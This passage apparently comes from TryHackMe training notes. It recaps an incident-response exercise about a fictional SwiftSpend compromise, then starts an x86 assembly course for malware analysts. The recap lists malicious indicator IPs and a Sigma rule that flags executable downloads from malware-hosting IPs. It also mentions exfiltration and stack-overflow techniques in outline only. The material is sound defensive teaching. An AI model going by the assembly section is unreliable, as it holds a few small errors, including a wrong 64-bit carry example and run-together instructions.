entirely. However, a lot of potential is lost whenever this is the case.

Wisdom
 is gained whenever you actively strive to learn from the experience, 
but it will remain just an experience and you will remain unlearned when
 the active effort of piecing it together is not there. Evaluated 
experience is key: this principle is transferrable in most aspects of 
life, and it’s the same in incident response.

Below is a recap of all the things that we’ve learned throughout the IR journey that we have so far.

# Preparation

In this [room](https://tryhackme.com/room/preparation),
 the emphasis is placed on the importance of establishing a response 
capability to ensure that the organization is able to respond to 
incidents. The room specifically focused on the importance of preparing 
the people, important documentations, and ample technological 
capabilities to maintain a level of readiness when an incident calls for
 it.

*People*
 touched upon the creation of a CSIRT team to ensure that the right 
people with their specific expertise are ready to go when an incident 
arises. *Documentations* touched
 upon the creation of policies and procedures that would make it easier 
for the response team to do their work seamlessly, while at the same 
time creating the opportunity to keep these details for later use, for 
litigation purposes or for the improvement of the organization’s 
security posture.

*Technological capabilities* touched
 upon the pieces of technology that would help make it easier for the 
team, focusing on having an inventory of assets, baseline security 
tools, and of course, having enough visibility.

Overall, being 
prepared means ensuring that people are ready, visibility is ample, and 
systems, networks, and applications are sufficiently secure.

# Identification and Scoping

In this [room](https://tryhackme.com/room/identificationandscoping),
 the emphasis is placed on the importance of the feedback loop between 
identification and scoping, wherein it is specifically stated that it is
 not a linear progression, rather it is a cyclic process that aims to 
continually refine the incident responder’s understanding of the 
incident and its scope.

The importance of the process being 
intelligence-driven is also stressed. Information must be taken 
advantage of, otherwise responders will essentially go about their work 
blindly. Overall, being in this phase of incident response means being 
on top of the ever-evolving incident environment, while being steered by
 threat intelligence.

# Containment and Threat Intel Creation

In this [room](https://tryhackme.com/room/intelcreationandcontainment),
 the emphasis is placed on the importance of threat intelligence in the 
cyclic process of identification, scoping, and containment. Just like 
the previous room, it acknowledges that an incident is constantly 
evolving and with that comes the assumed responsibility of always 
keeping informed and playing the game one step ahead of the threat actor
 by leveraging intelligence.

Containment strategies are discussed as well, which allows us to *act* while limiting the damage that the threat actor may cause to a minimum.

# Eradication, Remediation, and Recovery

In this [room](https://tryhackme.com/room/eradicationandremediation), the emphasis is placed on the fact that remediation is part of an ongoing IR process, and its success is reliant on the effectivity and synergy of all of the previous phases of the process.

While the containment phase limits the damage of the threat actor, in this phase, we *act* to
 plan for and actually remove the threat actor from the environment. 
Post-removal actions were also touched upon in the remediation and 
recovery parts of the room.

**The SwiftSpend Incident Recap**

Since we ought to sit down with the data that we’ve gathered throughout the IR process, below is a recap of all of the things about the SwiftSpend compromise that we found out over the course of our IR
 journey. Listing them out this way would not only make it easier to 
remember, but also would help us build our Executive and Technical 
summaries that are to be discussed later on in this room.

# Identification and Scoping

We saw how the compromise at SwiftSpend Financial (SSF) started and listed below is a summary of how it developed.

- Outdated endpoint protection definitions of the device owned by Derrick
Marshall, which is none other than the Head of IT - Operations and
Support
- Phishing incident involving Michael Ascot; credentials have been compromised but the SOC quickly advised the user to update his credentials
    - It’s later found out that it was a phishing campaign targeting both Michael
    Ascot and Alexander Swift, however the latter did not open a ticket nor
    report the issue
- Multiple phishing domains regarding the above incident were further discovered and added to the SoD
- In light of the incident, it’s been found out that it all stems from an
unpatched vulnerability in the form of missing email security (i.e., SPF, DMARC, and DKIM) that has already been previously identified for a while now, but for some reason is still yet to be remediated
- An updated SoD has been crafted, and is attached in the VM

# Containment and Threat Intel Creation

We developed unique pieces of threat intelligence from a packet capture. Listed below is a summary of our threat intel creation.

- Discovery of a malicious IP that serves as the threat actor’s host for additional malicious downloadables
- Another malicious IP (3.250.7.149) has been noted which is linked to the
tal0nix threat actor; further details link this threat actor to phishing reports involving an O365 page that presents the need to login via
email and password
- 2 different versions of a malicious Dropper was discovered as well

# Eradication, Remediation, and Recovery

We
 discussed the SSF compromise in further detail, particularly the effect
 of the swiftspend_admin credential leakage that led to the Jenkins server compromise and the discovery of the threat actor script leading to the implementation of their actions on objectives.

- swiftspend_admin credential leakage and threat actor discovery of password reuse that led to the compromise of the Jenkins server
- Jenkins platform compromise: discovery of a scheduled exfiltration script
(backup.sh) disguised as a backup implementation for the server
- Compromised Jenkins service account used as a backdoor
- Hijacked swiftspend domain (backup.swiftspend.com) via manual addition of the
threat actor’s IP (194.26.135.132) that receives the exfiltrated files
to the server’s hosts file

**The Executive and Technical Summaries**

Before everything else, start the virtual machine by clicking the green Start Machine button on the upper-right section of this task. If the VM is not visible, use the blue Show Split View button at the top-right of the page.

# Technical Summary

A
 technical summary is a summary of the relevant findings about the 
incident from detection to recovery. The goal of this document is to 
provide a concise description of the technical aspects of the incident, 
but it can also function as a quick reference guide.

At the end of
 the day, it’s supposed to collate the most important findings of the 
investigation while at the same time still being able to paint the 
complete picture, so a challenge that may arise is choosing which 
details to include and which ones to leave out. Remember that it is 
meant to be read by a technical audience, so it is advised to keep a 
balance of technical writing and conciseness in creating this summary.

The
 details from this summary are meant to be actioned upon, consequently 
ensuring that this type of compromise, from foothold to exploited 
vulnerabilities to lack of visibility, will all be covered so as to 
prevent it from happening again in the future.

# Executive Summary

At
 the end of the day, the Incident Response team will answer to the 
client, and in SwiftSpend’s case, the ‘client’ is essentially itself. 
The specific stakeholders involved would want to make sure that all of 
the findings are accounted for with the intention of being actioned 
upon, so having an executive summary is a way for them to keep a formal 
documentation of what happened.

Depending on the severity of the 
compromise, sometimes the C-Suite may want to know more about how it 
affected the business in the macro sense as well. However, since it’s a 
summary, it’s recommended to stick to the relevant items that they would
 want to know about.

A concise summary would contain, but may not be limited to the following:

- A summary of the impact of the compromise
    - Did we lose money?
        - Did they steal it?
        - Did we lose it due to downtime of sensitive servers / endpoints?
    - Did we lose data?
        - PIIs?
        - Proprietary pieces of information that are top secret?
    - Was it a high-profile case, and if so, what kind of reputational damage are we looking at here?
- A summary of the events and / or circumstances that led to / caused the compromise
    - How did this happen?
- A summary of the actions already done, and actions planned in the
near, mid, and long term to remediate and recover from it, and to
prevent it from happening again in the future

**Unique Threat Intelligence**

The SoD
 that we’ve created is a prime resource for threat intelligence unique 
to SSF. Remember that these are traces of a specific adversary that your
 environment has already faced and so, the inclusion of these indicators
 as part of your organization’s continuous monitoring and detection 
mechanism will immediately spot re-intrusion of that specific adversary.

This step is proof of how the phases of the IR process are cyclic. In integrating these indicators to the SOC’s
 detection mechanism, we go full circle. You can even go one step 
further and try to ‘generalize’ these indicators so similar threat 
actors may be detected too. The possibilities are great, and the world 
is your oyster.

To maximize our efficiency, we will transform these IOCs into detection rules in a vendor-agnostic format using **Sigma**, however, you can opt to use whichever format you’re familiar with.

Sigma
 is an open-source generic signature language developed to describe log 
events in a structured format. This allows for quick sharing of 
detection methods by security analysts. It also allows for a more 
flexible way of ‘storing’ a detection method as it can be easily 
transformed into different formats depending on the SIEM that you’re 
using. This can be achieved through tools such as [Uncoder.io](http://uncoder.io/), among others.

Let's find the malware-hosting IPs in our SoD,
 and create a detection mechanism for them. A basic example of how it 
can be written into a functional Sigma rule is as follows.

tal0nixIPdownloads.yml

```
title: Executable Download from tal0nix IPs
status: test
description: Detects download of .exe files from tal0nix IP hosts found in the SoD
reference: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/create_stream_hash/create_stream_hash_susp_ip_domains.yml
author: Mokmokmok
date: 2023/07/13
modified: 2023/07/13
logsource:
  product: windows
  category: create_stream_hash
detection:
  selection:
    Contents:
      - 'http://188.40.75.132'
      - 'http://3.250.38.141'
    TargetFilename|contains:
      - '.exe:Zone'
  condition: selection
falsepositives:
  - Unkown
level: High

```

The Sigma rule that we came up with from some of the details in the SoD
 is very simple and straightforward, yet the additional layer of 
detection that it gives the organization is invaluable. This is one of 
the reasons why this phase of the IR process should never be slept on.

## **MALWARE ANALYSIS**

## **x86 Architecture overview**

**CPU architecture overview**

The CPU
 architecture that is most widely used is derived from the Von Neumann 
architecture. A brief overview of this architecture is demonstrated in 
the below diagram.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8ddadb4fef3506e96698c52fdb668f62.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/8ddadb4fef3506e96698c52fdb668f62.png)

This diagram shows that the CPU has three components: the Arithmetic 
Logic Unit (ALU), the Control Unit, and the Registers. The CPU interacts
 with memory and I/O devices outside the CPU. Let's learn about each of 
the components mentioned in the diagram below.

## Control Unit:

The Control Unit gets instructions from the main memory, depicted here outside the CPU.
 The address to the next instruction to execute is stored in a register 
called the Instruction Pointer or IP. In 32-bit systems, this register 
is called EIP, and in 64-bit systems, it is called RIP.

## Arithmetic Logic Unit:

The arithmetic logic unit executes the instruction fetched from the 
Memory. The results of the executed instruction are then stored in 
either the Registers or the Memory.

## Registers:

The Registers are the CPU's storage. Registers are generally much smaller than the Main Memory, which is outside the CPU, and help save time in executing instructions by placing important data in direct access to the CPU.

## Memory:

The Memory, also called Main Memory or Random Access Memory (RAM), 
contains all the code and data for a program to run. When a user 
executes a program, its code and data are loaded into the Memory, from 
where the CPU accesses it one instruction at a time.

## I/O devices:

I/O devices or Input/Output devices are all other devices that 
interact with a computer. These devices include Keyboards, Mice, 
Displays, Printers, Mass storage devices like Hard Disks and USBs, etc.

In
 short, when a program has to be executed, it is loaded into the memory.
 From there, the Control Unit fetches one instruction at a time using 
the Instruction Pointer Register, and the Arithmetic Logic Unit executes
 it. The results are stored in either the Registers or the Memory.

**Registers overview**

Registers are the CPU's storage medium. The CPU
 can access data from the registers quicker than any other storage 
medium; however, its limited size means it has to be used effectively. 
For this purpose, the registers are divided into the following different
 types:

- Instruction Pointer
- General Purpose Registers
- Status Flag Registers
- Segment Registers

Let's go through each of these registers one by one below:

## The Instruction Pointer:

The Instruction Pointer is a register that contains the address of the next instruction to be executed by the CPU.
 It is also called the Program Counter. It was originally a 16-bit 
register in the Intel 8086 processor (from where the term x86 
originated) and was abbreviated as IP. In 32-bit processors, the 
Instruction Pointer became a 32-bit register called the EIP or the 
Extended Instruction Pointer. In 64-bit systems, this register became a 
64-bit register called RIP (the R here stands for register).

## General-Purpose Registers

The General-Purpose registers in an x86 system are all 32-bit 
registers. As the name suggests, these are used during the general 
execution of instructions by the CPU. In 64-bit systems, these registers are extended as 64-bit registers. They contain the following registers.

### EAX or RAX:

This is the Accumulator Register. Results of arithmetic operations 
are often stored in this register. In 32-bit systems, a 32-bit EAX 
register is present, while a 64-bit RAX register is present in 64-bit 
systems. The last 16 bits of this register can be accessed by addressing
 AX. Similarly, it can also be addressed in 8 bits by using AL for the 
lower 8 bits and AH for the higher 8 bits.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b3d7e425dae623de1ce2d57b25e4e809.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b3d7e425dae623de1ce2d57b25e4e809.png)

### EBX or RBX:

This register is also called the Base Register, which is often used 
to store the Base address for referencing an offset. Similar to the 
EAX/RAX, it can be addressed as 64-bit RBX, 32-bit EBX, 16-bit BX, and 
8-bit BH and BL registers.

### ECX or RCX:

This register is also called the Counter Register and is often used 
in counting operations such as loops, etc. Similar to the above two 
registers, it can be addressed as 64-bit RCX, 32-bit ECX, 16-bit CX, and
 8-bit CH and CL registers.

### EDX or RDX:

This register is also called the Data Register. It is often used in 
multiplication/division operations. Similar to the above registers, it 
can be addressed as 64-bit RDX, 32-bit EDX, 16-bit DX, and 8-bit DH and 
DL registers.

### ESP or RSP:

This register is called the Stack Pointer. It points to the top of 
the stack and is used in conjunction with the Stack Segment register. It
 is a 32-bit register called ESP in 32-bit systems and a 64-bit register
 called RSP in 64-bit systems. It can not be addressed as smaller 
registers.

### EBP or RBP:

This register is called the Base Pointer. It is used to access 
parameters passed by the stack. It is also used in conjunction with the 
Stack Segment register. It is a 32-bit register called EBP in 32-bit 
systems and a 64-bit register called RBP in 64-bit systems.

### ESI or RSI:

This register is called the Source Index register. It is used for 
string operations. It is used with the Data Segment (DS) register as an 
offset. It is a 32-bit register called ESI in 32-bit systems and a 64-bit register called RSI in 64-bit systems.

### EDI or RDI:

This register is called the Destination Index register. It is also 
used for string operations. It is used with the Extra Segment (ES) 
register as an offset. It is a 32-bit register called EDI in 32-bit 
systems and a 64-bit register called RDI in 64-bit systems.

### R8-R15:

These 64-bit general-purpose registers are not present in 32-bit 
systems. They were introduced in the 64-bit systems. They are also 
addressable in 32-bit, 16-bit, and 8-bit modes. For example, for the R8 
register, we can use R8D for lower 32-bit addressing, R8W for lower 
16-bit addressing, and R8B for lower 8-bit addressing. Here, the suffix D
 stands for Double-word, W stands for Word, and B stands for Byte.

## Status Flag Registers:

When performing execution, some indication about the status of the 
execution is sometimes required. This is where the Status Flags come in.
 This is a single 32-bit register for 32-bit systems called EFLAGS, 
which is extended to 64-bits for 64-bit systems, and called RFLAGS in 
the 64-bit system. The status flags register consists of individual 
single-bit flags that can be either 1 or 0. Some of the necessary flags 
are discussed below:

### Zero Flag:

Denoted by ZF, the Zero Flag indicates when the 
result of the last executed instruction was zero. For example, if an 
instruction is executed that subtracts a RAX from itself, the result 
will be 0. In this situation, the ZF will be set to 1.

### Carry Flag:

Denoted by CF, the Carry Flag indicates when the
 last executed instruction resulted in a number too big or too small for
 the destination. For example, if we add 0xFFFFFFFF and 0x00000001 and 
store the result in a 64-bit register, the result will be too big for 
the register. In this case, CF will be set to 1.

### Sign Flag:

The Sign Flag or SF indicates if the result of an
 operation is negative or the most significant bit is set to 1. If these
 conditions are met, the SF is set to 1; otherwise, it is set to 0.

### Trap Flag:

The Trap Flag or TF indicates if the processor is in debugging mode. When the TF is set, the CPU
 will execute one instruction at a time for debugging purposes. This can
 be used by malware to identify if they are being run in a debugger.

| **General Registers** | **Segment Registers** | **Status Registers** | **Instruction Pointer** |
| --- | --- | --- | --- |
| RAX, EAX, AX, AH, AL | CS | EFLAGS | EIP, RIP |
| RBX, EBX, BX, BH, BL | SS |  |  |
| RCX, ECX, CX, CH, CL | DS |  |  |
| RDX, EDX, DX, DH, DL | ES |  |  |
| RBP, EBP, BP | FS |  |  |
| RSP, ESP, SP | GS |  |  |
| RSI, ESI, SI |  |  |  |
| RDI, EDI, DI |  |  |  |
| R8-R15 |  |  |  |

## Segment Registers:

Segment Registers are 16-bit registers 
that convert the flat memory space into different segments for easier 
addressing. There are six segment registers, as explained below:

**Code Segment:** The Code Segment (CS ) register points to the Code section in the memory.

**Data Segment:** The Data Segment (DS) register points to the program's data section in the memory.

**Stack Segment:** The Stack Segment (SS) register points to the program's Stack in the memory.

**Extra Segments (ES, FS, and GS):**
 These extra segment registers point to different data sections. These 
and the DS register divide the program's memory into four distinct data 
sections.

**Memory overview**

When
 a program is loaded into the Memory in the Windows Operating System, it
 sees an abstracted view of the Memory. This means that the program 
doesn't have access to the full Memory; instead, it only has access to 
its Memory. For that program, that is all the Memory it needs. For the 
sake of brevity, we will not go into the details of how the Operating 
System performs abstraction. We will look at the Memory as a program 
sees it, as that is more relevant to us when reverse-engineering 
malware.

The diagram here is an overview of the typical memory layout for a 
program. As can be seen, Memory is divided into different sections, 
namely Stack, Heap, Code, and Data. While we have shown the four 
sections in a particular order, this can be different from how they will
 be all the time, e.g., the Code section can be below the Data section.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/52a0b7ce5d0fe5389e3d2f4ddd000de1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/52a0b7ce5d0fe5389e3d2f4ddd000de1.png)

We can find a brief overview of the four sections below.

## Code:

The Code Section, as the name implies, contains the program's code. 
Specifically, this section refers to the text section in a Portable 
Executable file, which includes instructions executed by the CPU. This section of the Memory has execute permissions, meaning that the CPU can execute the data in this section of the program memory.

## Data:

The Data section contains initialized data that is not variable and 
remains constant. It refers to the data section in a Portable Executable
 file. It often contains Global variables and other data that are not 
supposed to change during the program's execution.

## Heap:

The heap, also known as dynamic Memory, contains variables and data 
created and destroyed during program execution. When a variable is 
created, memory is allocated for that variable at runtime. And when that
 variable is deleted, the memory is freed. Hence the name dynamic 
memory.

## Stack:

The Stack is one of the important parts of the Memory from a malware 
analysis point of view. This section of the Memory contains local 
variables, arguments passed on to the program, and the return address of
 the parent process that called the program. Since the return address is
 related to the control flow of the CPU's instructions, the stack is 
often targeted by malware to hijack the control flow. You can look at 
the [Buffer Overflows](https://tryhackme.com/room/bof1) room to learn how this happens. We will cover more details about the stack in the next task.

**Stack Layout**

The
 Stack is a part of a program's memory that contains the arguments 
passed to the program, the local variables, and the program's control 
flow. This makes the stack very important regarding malware analysis and
 reverse engineering. Malware often exploits the stack to hijack the 
control flow of the program. Therefore it is important to understand the
 stack, its layout, and its working.

The stack is a Last In First Out (LIFO) memory. This means that the 
last element pushed onto the stack is the first one to be popped out. 
For example, if we push A, B, and C onto the stack, when we pop out 
these elements, the first to pop out will be C, B, and then A. The CPU
 uses two registers to keep track of the stack. One is the Stack Pointer
 (the ESP or RSP), and the other is the Base Pointer (the EBP or RBP).

## The Stack Pointer:

The Stack Pointer points to the top of the stack. When any new 
element is pushed on the stack, the location of the Stack Pointer 
changes to consider the new element that was pushed on the stack. 
Similarly, when an element is popped off the stack, the stack pointer 
adjusts itself to reflect that change.

## The Base Pointer:

The Base Pointer for any program remains constant. This is the 
reference address where the current program stack tracks its local 
variables and arguments.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/aed105638dc28ee3524baeaba8925e12.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/aed105638dc28ee3524baeaba8925e12.png)

## Old Base Pointer and Return Address:

Below the Base Pointer lies the old Base Pointer of the calling 
program (the program that calls the current program). And below the old 
Base Pointer lies the Return Address, where the Instruction Pointer will
 return once the current program's execution ends. A common technique to
 hijack control flow is to overflow a local variable on the stack such 
that it overwrites the Return Address with an address of the malware 
author's choice. This technique is called a Stack Buffer Overflow.

## Arguments:

The Arguments being passed to a function are pushed to the stack 
before the function starts execution. These arguments are present right 
below the Return Address on the stack.

## Function Prologue and Epilogue:

When a function is called, the stack is prepared for the function to 
execute. This means that the arguments are pushed to the stack before 
the start of the function execution. After that, the Return Address and 
the Old Base Pointer are pushed onto the stack. Once these elements are 
pushed, the Base Pointer address is changed to the top of the stack 
(which will be the Stack Pointer of the caller function at that time). 
As the function executes, the Stack Pointer moves as per the 
requirements of the function. This portion of code that pushes the 
arguments, the Return Address, and the Base Pointer onto the Stack and 
rearranges the Stack and Base Pointers is called the Function Prologue.

Similarly,
 the Old Base Pointer is popped off the stack and onto the Base Pointer 
when the function exits. The Return address is popped off to the 
Instruction Pointer, and the Stack Pointer is rearranged to point to the
 top of the stack. The part of the code that performs this action is 
called the Function Epilogue.

## **x86 Assembly Crash Course**

**Opcodes and Operands**

The code for a program, as written on the disk and understood by the CPU,
 is in binary format. This means that the actual code is a sequence of 
1s and 0s. To make it understandable, we often club a series of 8-bits 
(called a byte) into a single digit in hex. So the instructions that a 
computer is executing will be just a sequence of random numbers in hex 
to a human. Among these random numbers are opcodes and operands. Opcodes
 denote the hex for actual operations, and operands are the registers or
 memory locations on which the operations are performed.

## Opcodes

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2082c0d1510305a0c5ddfb50b7d4a2d5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2082c0d1510305a0c5ddfb50b7d4a2d5.png)

Opcodes are numbers that correspond to instructions performed by the CPU.
 When we use a disassembler (we will learn about disassemblers in the 
upcoming rooms) to disassemble a program, it reads the opcodes. It 
translates them into assembly instructions to make them human-readable. 
For example, the instruction for moving 0x5F to the eax register is:

`mov eax, 0x5f`

When looking at it in a disassembler, we will see:

`040000:    b8 5f 00 00 00    mov eax, 0x5f`

Here, the `040000:` corresponds to the address where the instruction is located. `b8` refers to the opcode of the instruction `mov eax`, and `5F 00 00 00` indicates the other operand `0x5f`. Please note that due to [endianness](https://en.wikipedia.org/wiki/Endianness), the operand 0x5f is written as `5f 00 00 00`, which is actually `00 00 00 5f` but in little-endian notation. Similarly, there is an opcode for each instruction in the assembly language. There are [references](http://ref.x86asm.net/index.html)
 for converting opcodes into assembly instructions. Still, unless we are
 writing a disassembler, we will not need them, as a disassembler does 
that work pretty well. However, it is good to understand what is 
happening under the hood for a better picture overall.

We saw that in the above operation, we had three parts, an instruction, `mov`, and two operands, `eax` and `0x5f`. In this particular instruction, the value `0x5f` is being moved into `eax`; however, we can also have other kinds of operands in the assembly language.

## Types of Operands

In general, there are three types of operands in the assembly language.

- *Immediate Operands* can also be considered constants. These are fixed values like we had the `0x5f` in the above example.
- *Registers* can also be operands. The above example shows `eax` as a register where the immediate operand is stored.
- *Memory operands* are denoted by square brackets, and they reference memory locations. For example, if we see `[eax]` as an operand, it will mean that the value in eax is the memory location on which the operation has to be performed.

**General Instructions**

Instructions tell the CPU
 what operation to perform. Instructions often use operands from 
registers, memory, or immediate operands to perform operations and then 
store the results in either registers or memory. In this task, we will 
learn the most common instructions that we might come across while 
reverse engineering malware.

## General Instructions

These instructions perform simple operations, such as moving a value from one type of storage to another.

### 

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/11c9b2d0082f5b4890a2b92f1f43f5d7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/11c9b2d0082f5b4890a2b92f1f43f5d7.png)

**The MOV Instruction**

The mov instruction moves a value from one location to another. Its syntax is as follows:

`mov destination, source`

The mov instruction can move a fixed value to a register, a register 
to another register, and a value in a memory location to a register. The
 following examples will help explain.

The following instruction copies a fixed value to a register. In this particular instruction, 0x5f is being moved to eax:

`mov eax, 0x5f`

In this particular case, the value stored in eax is being moved to ebx:

`mov ebx, eax`

The following instruction copies the value stored in a memory location to a register:

`mov eax, [0x5fc53e]`

As seen above, we use square brackets when referencing memory. 
Similarly, suppose we see a register in square brackets. In that case, 
that will mean that the value in that register will be treated as a 
memory location, and the value in that memory location will be moved to 
the destination. This means that the example `mov eax, [0x5fc3e]` and the below example will have the same result.

`mov ebx, 0x5fc53emov eax, [ebx]`

We can use the mov instruction to perform arithmetic calculations 
when referencing memory addresses. For example, the below instruction 
calculates ebp+4 (adding an offset of 4 bytes to the memory location) 
and moves the value in the resulting memory address into eax:

`mov eax, [ebp+4]`

### **The LEA Instruction**

The lea instruction stands for "load effective address." The format of this instruction is as follows:

`lea destination, source`

While the mov instruction moves the data at the source memory address
 to the destination, the lea instruction moves the address of the source
 into the destination. In the example below, the ebp value will be 
increased by four and moved to eax. However, if we had used a mov 
instruction here instead of lea, it would have moved the value in the 
memory location ebp+4.

`lea eax, [ebp+4]`

Here, we can notice that we have performed an arithmetic operation on
 a register and saved the result in another register using a single 
instruction. The `lea` instruction is often used by compilers
 not for referencing memory locations but so that an arithmetic 
operation is performed on a register and saved to another using a single
 instruction. This is true, especially if the arithmetic operations are 
more complex, like adding and multiplying in a single instruction. As we
 will see in the next task, using arithmetic operations for this 
operation will need several instructions.

### **The NOP Instruction**

The nop instruction stands for no operation. This instruction 
exchanges the value in eax with itself, resulting in no meaningful 
operation. Hence, the execution moves to the next instruction without 
changing anything. The nop instructions are used for consuming CPU cycles while waiting for an operation or other such purposes. It has the following syntax:

`nop`

The nop instruction is used by malware authors when redirecting 
execution to their shellcode. The exact location where the execution 
will redirect is often unknown, so the malware author uses a bunch of 
nop instructions to ensure that the shellcode execution does not start 
from the middle. This padding of nop instructions is called a nop sled.

### **Shift Instructions**

The CPU
 uses shift instructions to shift each register bit to the adjacent bit.
 There are two shift instructions for shifting either to the right or 
left. The shift instructions have the following syntax:

`shr destination, count
shl destination, count`

Here the `shr` instruction is for the shift right operation, and the `shl` is for the shift left operation. This instruction shifts the bits in the `destination` operand. The `count`
 operand decides the number of bits to be shifted. The bits which are 
shifted out of their location are filled with zeroes. So, if we have 
00000010 in eax and shift it left, it will become 00000100.

The carry flag (CF) is used to augment the destination, as it is filled 
by the last bit overflowing the destination. For example, if we have 
00000101 in eax and shift it right by 1 bit, the result will have 
00000010 in eax, and the carry flag will be set, i.e. it will have a 
value of 1.

Shift instructions are used instead of multiplication and division by two or powers of two (2n
 where n is the count in the shift instruction). This saves execution 
time by not having to manipulate values in registers before performing 
multiplication or division. For example, If eax has 00000010, and we 
shift right by 1 bit, we get 00000001, which is the same result as 
dividing eax by 2. Similarly, if eax has 00000001, and we shift left by 1
 bit, the result is 00000010, the same as multiplying eax by 2.

### **Rotate Instructions**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/f178ffadacdb65249b5088683375eacb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/f178ffadacdb65249b5088683375eacb.png)

The rotate instructions are similar to the shift instructions. The 
only difference is that the bits are rotated back to the other end of 
the register instead of moving the overflowing bit into the carry flag 
or adding zeroes instead of shifted-out bits. The rotate instruction has
 the following syntax:

`ror destination, count
rol destination, count`

Here, the `ror` instruction rotates the destination to the right, and `rol`
 rotates the destination to the left. The rest of the syntax remains the
 same. As an example, if we have 10101010 in al, and we rotate it right 
by 1 bit, it will result in 01010101. Similarly, rotating this result to
 the left by 1 bit will result in 10101010 again.

**Flags**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b8a2dd416ddfddd2ec5c493029aace70.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b8a2dd416ddfddd2ec5c493029aace70.svg)

In x86 assembly language, the CPU has several flags that indicate the
outcome of certain operations or conditions. These flags are bits in a
special register known as the

**flags register**

or

**EFLAGS**

register.
Each flag represents a specific condition or result of the most recent
arithmetic or logical operation. Here’s a table with the most common
flags in x86 assembly and their explanations:

| Flag | Abbreviation | Explanation |
| --- | --- | --- |
| Carry | CF | Set when a carry-out or borrow is required from the most
significant bit in an arithmetic operation. Also used for bit-wise
shifting operations. |
| Parity | PF | Set if the least significant byte of the result contains an even
number of 1 bits. |
| Auxiliary | AF | Set if a carry-out or borrow is required from bit 3 to bit 4 in
an arithmetic operation (BCD arithmetic). |
| Zero | ZF | Set if the result of the operation is zero. |
| Sign | SF | Set if the result of the operation is negative (i.e., the most
significant bit is 1). |
| Overflow | OF | Set if there's a signed arithmetic overflow (e.g., adding two
positive numbers and getting a negative result or vice versa). |
| Direction | DF | Determines the direction for string processing instructions. If
DF=0, the string is processed forward; if DF=1, the string is
processed backward. |
| Interrupt Enable | IF | If set (1), it enables maskable hardware interrupts. If cleared (0),
interrupts are disabled. |

Flags can be used in conditional jumps and are crucial for
implementing conditional branching in assembly code. For example, you
might only jump to a specific address if a certain flag is set or
cleared.

**Arithmetic  and Logical Instructions**

## Arithmetic Operations

Arithmetic Operations are performed by a CPU using arithmetic instructions. In this task, we will go through these instructions.

### **Addition and Subtraction Instructions**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ac925fb94fa4bb260c4eb1305116536e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ac925fb94fa4bb260c4eb1305116536e.png)

The syntax for the addition instruction is as follows. The value is 
added to the destination, and the result is stored in the destination.

`add destination, value`

The subtraction instruction follows a similar syntax. In the below 
syntax, the value is subtracted from the destination, and the result is 
stored in the destination.

`sub destination, value`

In the above examples, the value can be either a fixed value constant
 or a register. For the subtraction operation, Zero Flag (ZF) is set if 
the result of the subtraction is zero. If the destination is smaller 
than the subtracted value, then the Carry Flag (CF) is set.

### **Multiplication and Division Instructions**

The multiplication and division operations use the eax and the edx 
registers. Therefore, we will have to look at the last instruction that 
manipulated these registers for every multiply and divide operation.

The multiply instruction has the following format. It multiplies the 
value with eax and stores the result in edx:eax as a 64-bit value. Two 
registers are required here because the result of multiplying 2 32-bit 
values can often be higher than 32 bits. The lower 32 bits of the result
 are stored in the eax register, and the higher 32 bits are stored in 
the edx register.

`mul value`

The value can be another register or a constant as an immediate operand.

For
 the division instruction, the case is the opposite. It divides the 
64-bit value in edx:eax and saves the result in eax and the remainder in
 edx.

`div value`

### **Increment and Decrement Instructions**

As the name suggests, the increment and decrement instructions 
increment or decrement the operand register by 1. The syntax to 
increment eax by 1 is as follows:

`inc eax`

Similarly, the syntax to decrement eax by 1 using the decrement instruction is as follows:

`dec eax`

## Logical Instructions

Logical instructions are used to perform logical operations. Let's go through a few common logical operations performed by the CPU.

### **AND Instruction**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fe65064650c127faea67d1b23a17aefe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fe65064650c127faea67d1b23a17aefe.png)

The AND instruction performs a bitwise AND operation on the operands.
 An AND operation returns an output of 1 when both the inputs are 1; 
otherwise, it returns 0. An example instruction is below:

`and al, 0x7c`

In this example, 0x7c converts to 01111100 in binary. Suppose al had a
 value of 0xfc, which is 11111100 in binary. In this case, the output of
 the above instruction will be 01111100. However, if al has a value of 
0x8c, 10001100 in binary, the result of the above instruction will be 
00001100 or 0xc.

### **OR Instruction**

The OR instruction performs a bitwise OR operation. An OR operation 
returns 1 if at least one of the operands is 1. It returns 0 if none of 
the operands is 1. An example instruction is below:

`or al, 0x7c`

In this example, if al had a value of 0xfc or 11111100 in binary, the
 output of the above instruction will be 11111100. Similarly, if al has a
 value of 0x8c or 10001100 in binary, the result will still be 11111100 
in binary or 0xfc.

### **NOT Instruction**

The NOT instruction takes one operand. It simply inverts the operand 
bits, replacing 1s with 0s and vice versa. In the following example, if 
al had a value of 11110000, it would result in 00001111.

`not al`

### **XOR Instruction**

The XOR
